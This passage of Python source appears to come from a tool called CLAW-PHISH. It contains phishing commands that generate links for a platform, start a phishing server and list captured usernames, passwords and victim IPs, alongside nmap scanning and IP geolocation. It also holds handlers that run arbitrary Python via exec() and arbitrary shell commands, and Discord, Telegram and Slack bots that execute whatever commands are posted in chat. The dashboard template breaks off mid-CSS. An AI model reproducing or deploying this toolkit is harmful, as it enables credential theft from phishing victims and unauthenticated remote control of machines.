    # ==================== Domain Hosting Commands ====================
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        ip = args[0]
        try:
            domain = self.domain_hosting.translate_ip_to_domain(ip)
            if domain:
                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            return {'success': False, 'output': f"No domain found for IP {ip}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        domain = args[0]
        try:
            ip = self.domain_hosting.translate_domain_to_ip(domain)
            if ip:
                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
            return {'success': False, 'output': f"No IP found for domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        try:
            domain_host = self.domain_hosting.host_domain(ip, domain, port)
            if domain_host:
                return {
                    'success': True,
                    'output': f"Domain {domain} hosted on IP {ip}:{port}\nID: {domain_host.id}\nPath: {domain_host.hosting_path}"
                }
            return {'success': False, 'output': f"Failed to host domain {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _host_website(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        domain = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            success = self.domain_hosting.host_website(domain, html_content)
            if success:
                return {'success': True, 'output': f"Website hosted on http://{domain}"}
            return {'success': False, 'output': f"Failed to host website on {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        try:
            domains = self.domain_hosting.list_hosted_domains()
            if not domains:
                return {'success': True, 'output': 'No hosted domains'}
            output = "Hosted Domains:\n"
            for d in domains:
                status = "🟢 Active" if d['active'] else "🔴 Inactive"
                output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _domain_info(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domain = args[0]
        try:
            domains = self.domain_hosting.list_hosted_domains()
            for d in domains:
                if d['domain'] == domain:
                    return {'success': True, 'output': json.dumps(d, indent=2)}
            return {'success': False, 'output': f"Domain {domain} not found"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    # ==================== Phishing Commands ====================
    def _phish(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish <platform>'}
        platform = args[0].lower()
        return self._phish_platform(platform)
    
    def _phish_platform(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            url = self.social.phishing_server.get_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_status(self, args: List[str]) -> Dict:
        status = "Running" if self.social.phishing_server.running else "Stopped"
        url = self.social.phishing_server.get_url() if self.social.phishing_server.running else "N/A"
        return {'success': True, 'output': f"Phishing Server Status: {status}\nURL: {url}"}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links(active_only=True)
        if not links:
            return {'success': True, 'output': 'No active phishing links'}
        output = "Active Phishing Links:\n"
        for link in links:
            output += f"  • {link['id']} - {link['platform']} ({link['clicks']} clicks)\n"
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        domain = args[0]
        result = self._generic([f'dig {domain}'])
        return result
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        domain = args[0]
        result = self._generic([f'nslookup {domain}'])
        return result
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        # Try to resolve domain for this IP
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"🦀 CLAW-PHISH IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Web Terminal Commands ====================
    def _web_start(self, args: List[str]) -> Dict:
        try:
            port = int(args[0]) if args else 5000
            return {'success': True, 'output': f"Web terminal starting on port {port}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _web_stop(self, args: List[str]) -> Dict:
        return {'success': True, 'output': "Web terminal stopped"}
    
    def _web_status(self, args: List[str]) -> Dict:
        return {'success': True, 'output': "Web terminal status: Running"}
    
    # ==================== Platform Bot Commands ====================
    def _discord_start(self, args: List[str]) -> Dict:
        if self.discord:
            if self.discord.config.get('enabled') and self.discord.config.get('token'):
                self.discord.start()
                return {'success': True, 'output': 'Discord bot starting...'}
            return {'success': False, 'output': 'Discord bot not configured. Run setup.'}
        return {'success': False, 'output': 'Discord not available'}
    
    def _discord_stop(self, args: List[str]) -> Dict:
        if self.discord:
            self.discord.running = False
            if self.discord.bot:
                try:
                    asyncio.run_coroutine_threadsafe(self.discord.bot.close(), self.discord.bot.loop)
                except:
                    pass
            return {'success': True, 'output': 'Discord bot stopped'}
        return {'success': False, 'output': 'Discord not available'}
    
    def _telegram_start(self, args: List[str]) -> Dict:
        if self.telegram:
            if self.telegram.config.get('enabled') and self.telegram.config.get('bot_token'):
                self.telegram.start()
                return {'success': True, 'output': 'Telegram bot starting...'}
            return {'success': False, 'output': 'Telegram bot not configured. Run setup.'}
        return {'success': False, 'output': 'Telegram not available'}
    
    def _telegram_stop(self, args: List[str]) -> Dict:
        if self.telegram:
            self.telegram.running = False
            return {'success': True, 'output': 'Telegram bot stopped'}
        return {'success': False, 'output': 'Telegram not available'}
    
    def _slack_start(self, args: List[str]) -> Dict:
        if self.slack:
            if self.slack.config.get('enabled') and self.slack.config.get('bot_token'):
                self.slack.start()
                return {'success': True, 'output': 'Slack bot starting...'}
            return {'success': False, 'output': 'Slack bot not configured. Run setup.'}
        return {'success': False, 'output': 'Slack not available'}
    
    def _slack_stop(self, args: List[str]) -> Dict:
        if self.slack:
            self.slack.running = False
            return {'success': True, 'output': 'Slack bot stopped'}
        return {'success': False, 'output': 'Slack not available'}
    
    def _signal_start(self, args: List[str]) -> Dict:
        if self.signal:
            if self.signal.config.get('enabled') and self.signal.config.get('phone_number'):
                self.signal.start()
                return {'success': True, 'output': 'Signal bot starting...'}
            return {'success': False, 'output': 'Signal bot not configured. Run setup.'}
        return {'success': False, 'output': 'Signal not available'}
    
    def _signal_stop(self, args: List[str]) -> Dict:
        if self.signal:
            self.signal.running = False
            return {'success': True, 'output': 'Signal bot stopped'}
        return {'success': False, 'output': 'Signal not available'}
    
    def _whatsapp_start(self, args: List[str]) -> Dict:
        if self.whatsapp:
            if self.whatsapp.config.get('enabled') and self.whatsapp.config.get('phone_number'):
                self.whatsapp.start()
                return {'success': True, 'output': 'WhatsApp bot starting...'}
            return {'success': False, 'output': 'WhatsApp bot not configured. Run setup.'}
        return {'success': False, 'output': 'WhatsApp not available'}
    
    def _whatsapp_stop(self, args: List[str]) -> Dict:
        if self.whatsapp:
            self.whatsapp.running = False
            return {'success': True, 'output': 'WhatsApp bot stopped'}
        return {'success': False, 'output': 'WhatsApp not available'}
    
    def _platform_status(self, args: List[str]) -> Dict:
        output = "🤖 Platform Status:\n"
        output += f"  Discord: {'🟢 Running' if self.discord and self.discord.running else '🔴 Stopped'}\n"
        output += f"  Telegram: {'🟢 Running' if self.telegram and self.telegram.running else '🔴 Stopped'}\n"
        output += f"  Slack: {'🟢 Running' if self.slack and self.slack.running else '🔴 Stopped'}\n"
        output += f"  Signal: {'🟢 Running' if self.signal and self.signal.running else '🔴 Stopped'}\n"
        output += f"  WhatsApp: {'🟢 Running' if self.whatsapp and self.whatsapp.running else '🔴 Stopped'}\n"
        return {'success': True, 'output': output}
    
    def _platform_list(self, args: List[str]) -> Dict:
        output = "🤖 Available Platforms:\n"
        output += f"  • Discord - {'Available' if DISCORD_AVAILABLE else 'Not Available'}\n"
        output += f"  • Telegram - {'Available' if TELETHON_AVAILABLE else 'Not Available'}\n"
        output += f"  • Slack - {'Available' if SLACK_AVAILABLE else 'Not Available'}\n"
        output += f"  • Signal - {'Available' if SIGNAL_AVAILABLE else 'Not Available'}\n"
        output += f"  • WhatsApp - {'Available' if WHATSAPP_AVAILABLE else 'Not Available'}\n"
        output += f"  • iMessage - {'Available' if IMESSAGE_AVAILABLE else 'Not Available'}\n"
        return {'success': True, 'output': output}
    
    # ==================== Python Commands ====================
    def _python(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: python <code>'}
        code = ' '.join(args)
        try:
            exec_globals = {'__builtins__': __builtins__}
            exec(code, exec_globals)
            return {'success': True, 'output': f"Executed: {code}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _python3(self, args: List[str]) -> Dict:
        return self._python(args)
    
    def _pip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: pip <command>'}
        return self._generic(['pip'] + args)
    
    def _pip3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: pip3 <command>'}
        return self._generic(['pip3'] + args)
    
    # ==================== Generic Command ====================
    def _generic(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: !<command> or <command>'}
        command = ' '.join(args)
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🦀 CLAW-PHISH Response", description=f"```{output}```",
                                     color=0xFF3D3D)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.bot and self.running:
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(text), self.bot.loop)
        except:
            pass
    
    def send_file(self, file_path: str):
        try:
            if self.bot and self.running and os.path.exists(file_path):
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(file=discord.File(file_path)), self.bot.loop)
        except:
            pass

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('claw_phish_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.client and self.running:
                asyncio.run_coroutine_threadsafe(
                    self.client.send_message(self.config['chat_id'], text[:4000]),
                    self.client.loop
                )
        except:
            pass
    
    def send_photo(self, photo_path: str):
        try:
            if self.client and self.running and os.path.exists(photo_path):
                asyncio.run_coroutine_threadsafe(
                    self.client.send_file(self.config['chat_id'], photo_path),
                    self.client.loop
                )
        except:
            pass

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, text: str):
        try:
            if self.client:
                self.client.chat_postMessage(
                    channel=self.config.get('channel_id', 'general'),
                    text=text[:4000]
                )
        except:
            pass

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, command_handler, db: DatabaseManager, config: ConfigManager):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Advanced Red & White Dashboard Template
        TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CLAW-PHISH - Cybersecurity Dashboard</title>
            <style>
                :root{
                    --red-deep: #1a0000;
                    --red: #2d0000;
                    --red-panel: #3d0a0a;
                    --red-mid: #8b0000;
                    --red-bright: #ff3d3d;
                    --red-light: #ff6b6b;
                    --white: #f4f9ff;
                    --slate: #b07f7f;
                    --line: #3d1a1a;
                }
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Courier New', monospace;
                    background: var(--red-deep);
                    color: var(--white);
                    min-height: 100vh;
                    background:
                        radial-gradient(ellipse at 20% -10%, rgba(255,61,61,0.14), transparent 55%),
                        radial-gradient(ellipse at 100% 110%, rgba(255,107,107,0.08), transparent 50%),
                        var(--red-deep);
                }
                .header {
                    background: linear-gradient(180deg, var(--red) 0%, var(--red-deep) 100%);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid var(--red-bright);
                    box-shadow: 0 0 30px rgba(255,61,61,0.1);
                }
                .header h1 { 
                    font-size: 2.8em; 
                    color: var(--white);
                    text-shadow: 0 0 20px rgba(255,61,61,0.3);
                    letter-spacing: 6px;
                }
                .header h1 span { color: var(--red-bright); }
                .header p { 
                    color: var(--slate);
                    font-size: 0.9em;
                    letter-spacing: 2px;
                }
                .container { 
                    max-width: 1400px; 
                    margin: 0 auto; 
                    padding: 20px; 
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: var(--red-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    text-align: center;
                    backdrop-filter: blur(10px);
                    transition: all 0.3s;
                }
                .stat-card:hover {
                    border-color: var(--red-bright);
                    box-shadow: 0 0 30px rgba(255,61,61,0.05);
                    transform: translateY(-2px);
                }
                .stat-card h3 { 
                    font-size: 2.5em; 
                    color: var(--red-light);
                    font-weight: normal;
                    text-shadow: 0 0 20px rgba(255,107,107,0.2);
                }
                .stat-card p { 
                    margin-top: 10px; 
                    opacity: 0.6;
                    color: var(--slate);
                    font-size: 0.9em;
                }
                .section {
                    background: var(--red-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 20px;
                    backdrop-filter: blur(10px);
                }
                .section h2 { 
                    margin-bottom: 15px; 
                    color: var(--white);
                    font-weight: normal;
                    letter-spacing: 3px;
                    border-bottom: 1px solid var(--line);
                    padding-bottom: 10px;
                }
                table { 
                    width: 100%; 
                    border-collapse: collapse; 
                    color: var(--white);
                }
                th, td { 
                    padding: 12px; 
                    text-align: left; 
                    border-bottom: 1px solid var(--line); 
                }
                th { 
                    background: var(--red);
                    color: var(--red-light);
                    font-weight: normal;
                    letter-spacing: 2px;
                }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: var(--red);
                    border: 1px solid var(--line);
                    border-radius: 4px;
                    color: var(--white);
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    margin-bottom: 10px;
                }
                .command-input:focus { 
                    outline: none; 
                    border-color: var(--red-bright);
                    box-shadow: 0 0 20px rgba(255,61,61,0.1);
                }
                button {
                    background: var(--red-mid);
                    color: var(--white);
                    border: 1px solid var(--red-bright);
                    padding: 12px 30px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    transition: all 0.3s;
                }
                button:hover { 
                    background: var(--red-bright);
                    border-color: var(--white);
                    box-shadow: 0 0 30px rgba(255,61,61,0.2);
                }
                .output {
                    background: var(--red);
                    border-radius: 4px;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: var(--white);
                    border: 1px solid var(--line);
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 2px;
                    font-size: 12px;
                }
                .status-online { background: rgba(255,107,107,0.15); color: var(--red-light); }
                .status-offline { background: rgba(255,0,0,0.15); color: #ff6b6b; }
                .severity-critical { background: rgba(255,0,0,0.2); color: #ff6b6b; }
                .severity-high { background: rgba(255,150,0,0.2); color: #ff9800; }
                .severity-medium { background: rgba(255,255,0,0.15); color: #ffc107; }
                .severity-low { background: rgba(255,107,107,0.1); color: var(--red-light); }
                ::-webkit-scrollbar {
                    width: 4px;
                }
                ::-webkit-scrollbar-track {
                    background: var(--red);
                }
                ::-webkit-scrollbar-thumb {
                    background: var(--red-bright);
                }
                .glow { 
                    animation: glow 2s ease-in-out infinite; 
                }
                @keyframes glow {
                    0% { box-shadow: 0 0 5px rgba(255,61,61,0.1); }
                    50% { box-shadow: 0 0 30px rgba(255,61,61,0.2); }
                    100% { box-shadow: 0 0 5px rgba(255,61,61,0.1); }
                }
                .warning-banner {
